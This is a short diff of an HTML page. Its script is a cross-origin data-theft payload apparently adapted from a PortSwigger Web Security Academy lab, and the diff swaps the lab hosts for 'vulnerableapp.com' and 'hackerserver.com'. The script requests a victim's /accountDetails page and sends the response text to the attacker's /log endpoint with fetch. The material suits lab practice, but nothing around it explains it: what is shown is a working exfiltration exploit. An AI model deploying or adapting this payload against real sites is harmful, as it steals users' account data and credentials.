@@ -3,10 +3,10 @@
         <h1>Hello World!</h1>
         <script>
             var xhr = new XMLHttpRequest();
-            var url = "https://acb21f131eba5814c07467aa003f0048.web-security-academy.net/accountDetails"
+            var url = "https://vulnerableapp.com/accountDetails"
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == XMLHttpRequest.DONE){
-                    fetch("https://exploit-acb21f961e1a5849c0e067fc01f30007.web-security-academy.net/log?key=" + xhr.responseText)
+                    fetch("https://hackerserver.com/log?key=" + xhr.responseText)
                 }
             }
             xhr.open("GET", url, true);
